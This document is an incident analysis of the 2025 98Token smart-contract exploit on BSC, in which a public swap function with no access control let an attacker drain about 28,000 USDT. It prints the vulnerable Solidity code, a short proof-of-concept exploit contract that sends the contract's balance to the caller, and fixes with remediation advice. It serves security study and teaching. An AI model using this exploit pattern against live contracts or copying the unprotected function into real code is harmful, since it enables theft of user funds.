# 98Token — Analysis of Public Swap Function Without Access Control

| Field | Details |
|------|------|
| **Date** | 2025-01-07 |
| **Protocol** | 98Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$28,000 USDT |
| **Attacker** | [0x67A5...e7E2](https://bscscan.com/address/0x67A5f6bd9F8763c7E6C4EA0b54D1b14B9e5ee7E2) |
| **Attack Tx** | [0x61da5b50...](https://bscscan.com/tx/0x61da5b502a62d7e9038d73e31ceb3935050430a7f9b7e29b9b3200db3095f91d) |
| **Vulnerable Contract** | [0xB040D88e...](https://bscscan.com/address/0xB040D88e61EA79a1289507d56938a6AD9955349C) |
| **Root Cause** | `swapTokensForTokens()` has no access control, allowing anyone to swap tokens held by the contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/98Token_exp.sol) |

---

## 1. Vulnerability Overview

The 98Token swap contract (`0xB040D88e...`) declared `swapTokensForTokens()` as `public` with no caller validation logic whatsoever. The attacker directly called this function to swap the contract's entire 98Token balance into USDT, setting the recipient address to the attacker's own address, thereby stealing 28,000 USDT.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: swap function callable by anyone
function swapTokensForTokens(
    address[] calldata path,   // swap path (token_98 → USDT)
    uint256 amountIn,          // entire contract balance
    uint256 amountOutMin,      // 0 (no slippage protection)
    address recipient          // can be set to attacker's address
) public {  // ← no access control
    IERC20(path[0]).approve(router, amountIn);
    IRouter(router).swapExactTokensForTokens(
        amountIn, amountOutMin, path, recipient, block.timestamp
    );
}

// ✅ Safe code: only owner can call
function swapTokensForTokens(...) external onlyOwner {
    // same logic as above
}
```

### On-Chain Original Code

Source: **Sourcify-verified** — Main (PancakeRouter base) / 0xB040D88e61EA79a1289507d56938a6AD9955349C (BSC)
BSCScan verified source: https://bscscan.com/address/0xB040D88e61EA79a1289507d56938a6AD9955349C#code

```solidity
// SPDX-License-Identifier: MIT
// File: Main.sol  (contract PancakeRouter, inherited by Main)
// Source: BSCScan verified — 0xB040D88e61EA79a1289507d56938a6AD9955349C (BSC)

contract PancakeRouter {
    IPancakeRouter public constant _IPancakeRouter =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // ❌ No access control modifier — callable by ANY address
    // ❌ `to` parameter lets caller redirect output to any address (e.g. themselves)
    // ❌ `tokenOutMin = 0` accepted with no validation
    function swapTokensForTokens(
        address[] memory path,
        uint256 tokenAmount,
        uint256 tokenOutMin,
        address to           // ❌ arbitrary recipient — attacker passes own address
    ) public {               // ❌ public with no onlyOwner or access check
        _IPancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            tokenOutMin,     // ❌ attacker supplies 0 — no slippage protection
            path,
            to,              // ❌ funds sent directly to attacker-controlled address
            block.timestamp + 60
        );
    }
}

contract Main is PancakeRouter, Ownable {
    using SafeERC20 for IERC20;
    IERC20 public constant USDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public Token          = IERC20(0xc0dDfD66420ccd3a337A17dD5D94eb54ab87523F); // 98Token
    // ... (rest of business logic omitted)
}
```

**Why it is exploitable (identify the bug from the code):**
- `swapTokensForTokens` is declared `public` in `PancakeRouter` with no `onlyOwner`, `onlyRole`, or any caller check.
- The `to` parameter is forwarded directly to the router: any caller can set it to their own address, causing the contract's own token balance to be swapped and sent to the attacker.
- `tokenOutMin = 0` is accepted without validation, enabling zero-slippage drains with no minimum output requirement.
- The contract holds 98Token on behalf of the protocol (accumulated from fees/purchases). The attacker called the function with `path = [98Token, USDT]`, `tokenAmount = contract's full balance`, `tokenOutMin = 0`, `to = attacker address`, draining 28,000 USDT in a single call.

```solidity
// ✅ Fix: restrict caller and hardcode recipient
function swapTokensForTokens(
    address[] memory path,
    uint256 tokenAmount,
    uint256 tokenOutMin
) external onlyOwner {                          // ✅ only owner may call
    _IPancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        tokenOutMin,
        path,
        owner(),                                // ✅ funds go to owner, not caller-supplied address
        block.timestamp + 60
    );
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Check token_98 balance held by vulnerable contract
  │
  ├─→ [2] Directly call swapTokensForTokens()
  │         ├─ path: [token_98, USDT]
  │         ├─ amountIn: entire contract balance
  │         ├─ amountOutMin: 0
  │         └─ recipient: attacker's address
  │
  ├─→ [3] Execute token_98 → USDT swap from contract holdings
  │
  └─→ [4] Receive 28,000 USDT
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Exploit {
    address constant SWAP_CONTRACT = 0xB040D88e61EA79a1289507d56938a6AD9955349C;
    address constant TOKEN_98 = /* token_98 address */;
    address constant USDT = /* USDT address */;

    function exploit() external {
        // [1] Query token_98 balance of the vulnerable contract
        uint256 balance = IERC20(TOKEN_98).balanceOf(SWAP_CONTRACT);

        // [2] Directly call the function with no access control
        //     Set recipient to attacker (msg.sender)
        address[] memory path = new address[](2);
        path[0] = TOKEN_98;
        path[1] = USDT;

        ISwapContract(SWAP_CONTRACT).swapTokensForTokens(
            path,
            balance,    // drain entire balance
            0,          // no slippage protection
            msg.sender  // attacker receives funds
        );
        // Result: 28,000 USDT obtained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct function call) |
| **DApp Category** | Token swap contract |
| **Impact** | Complete drain of contract-held assets |

## 6. Remediation Recommendations

1. **Add Access Control**: Apply `onlyOwner` or role-based access control (RBAC) to the swap function
2. **Fix Recipient**: Hardcode the `recipient` parameter as an internal constant so it cannot be specified externally
3. **Slippage Protection**: Block calls that set `amountOutMin` to 0 (enforce a minimum expected output)
4. **Function Visibility Audit**: Review all `public` functions and change any that do not require external access to `internal` or `private`

## 7. Lessons Learned

- Every function that moves assets in a smart contract must have strict access control.
- `public` visibility permits unintended external calls — this is one of the most fundamental yet devastating security vulnerabilities.
- During development, always ask: "Is there a reason for this function to be called externally?"
- Allowing zero slippage by design can cause additional losses when combined with MEV attacks.